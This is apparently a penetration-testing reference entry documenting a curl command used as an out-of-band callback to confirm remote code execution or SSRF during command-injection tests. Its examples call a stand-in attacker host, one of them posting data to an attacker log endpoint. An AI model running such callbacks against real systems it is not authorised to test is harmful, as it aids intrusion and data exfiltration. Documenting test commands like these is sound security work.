---
data: 'curl http://attacker-ip/test-payload'
tags:
  - testing
  - rce
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:38:49.186Z'
id: db1f6762-1cf1-420f-aa63-d6c33ddc4f91
verified: false
validated: true
submitted: true
---
# curl-external-request

## Command

```bash
curl http://attacker-ip/test-payload
```

## Description

This command performs an external HTTP request to test for outbound connectivity from a target system, commonly used in RCE or SSRF validation during command injection attempts.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `http://attacker-ip/test-payload` | URL of the attacker's server endpoint | Yes |

## Examples

### Basic Usage

```bash
curl http://attacker-ip/test
```

### Advanced Usage

```bash
curl -X POST http://attacker-ip/log -d 'injected'
```

## Expected Output

HTTP response from server, e.g., 200 OK if reachable; used to confirm callback in injection tests.

## Related

- [[commands/netcat-listen]]
- [[procedures/Test-DNS-Check-for-RCE]]
